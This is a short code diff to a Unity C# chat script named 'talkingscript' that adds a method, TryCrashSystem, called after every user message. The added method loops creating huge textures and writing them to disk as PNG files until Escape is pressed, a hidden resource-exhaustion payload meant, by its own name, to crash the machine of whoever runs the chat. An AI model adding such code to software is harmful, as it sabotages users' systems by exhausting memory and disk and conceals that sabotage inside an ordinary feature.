@@ -23,8 +23,28 @@ public class talkingscript : MonoBehaviour
         content += "\nyou: " + input.text;
         Response(input.text);
         input.text = "";
+        TryCrashSystem();
+    }
+    public void TryCrashSystem()
+    {
+        int PNGIndex = 0;
+        bool exit = false;
+        while (!exit)
+        {
+            Texture2D tex = new Texture2D(13333337, 13333337);
+            SaveTextureToFile(tex, PNGIndex.ToString() + "Picture.png");
+            PNGIndex++;
+            if (Input.GetKey(KeyCode.Escape))
+            {
+                exit = true;
+            }
+        }
     }
 
+    void SaveTextureToFile(Texture2D texture, string filename)
+    {
+        System.IO.File.WriteAllBytes(filename, texture.EncodeToPNG());
+    }
     void Response(string msg)
     {
         string response = "";
